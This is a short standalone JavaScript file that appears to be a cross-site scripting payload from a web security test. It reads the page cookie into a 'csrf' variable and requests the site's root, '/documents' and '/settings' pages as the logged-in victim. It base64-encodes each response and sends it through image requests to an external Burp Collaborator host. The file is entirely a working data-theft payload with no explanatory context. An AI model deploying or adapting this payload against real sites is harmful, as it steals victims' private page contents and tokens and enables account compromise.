leak = function(name, data)
{
   var i = document.createElement('img');
   i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
   document.body.appendChild(i); 
}

function reqListener () {
   leak("pre-response","1");
   leak("response", this.responseText);
   leak("post-response","1");
}

get = function(url)
{
 
   var XHR = new XMLHttpRequest();
   XHR.addEventListener('error', function( event ) {
      leak("get_error","Something went wrong");
   });
   XHR.addEventListener('load', reqListener);
   XHR.open('GET', url);
   XHR.send();
}

var csrf = document.cookie.split('=')[1];

get("/");
get("/documents");
get("/settings");
